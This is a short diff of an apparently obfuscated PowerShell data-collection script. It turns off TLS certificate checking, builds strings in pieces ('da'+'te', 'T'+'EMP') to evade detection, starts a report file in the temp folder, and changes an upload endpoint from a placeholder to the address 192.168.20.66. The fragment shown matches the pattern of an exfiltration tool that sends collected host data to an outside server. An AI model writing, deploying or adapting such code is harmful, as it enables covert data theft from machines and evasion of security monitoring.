@@ -8,7 +8,7 @@ public bool CheckValidationResult(ServicePoint s,X509Certificate c,WebRequest r,
 [Net.ServicePointManager]::CertificatePolicy = New-Object T
 
 $h = "$env:T"+"EMP\rep"+"ort.txt"
-$z = ("https://"+"XXX.XXX.XXX.XXX"+"/upl"+"oad")
+$z = ("https://"+"192.168.20.66"+"/upl"+"oad")
 
 "=D=" | Out-File $h -Encoding UTF8
 (&('da'+'te')) | Out-File $h -Append -Encoding UTF8
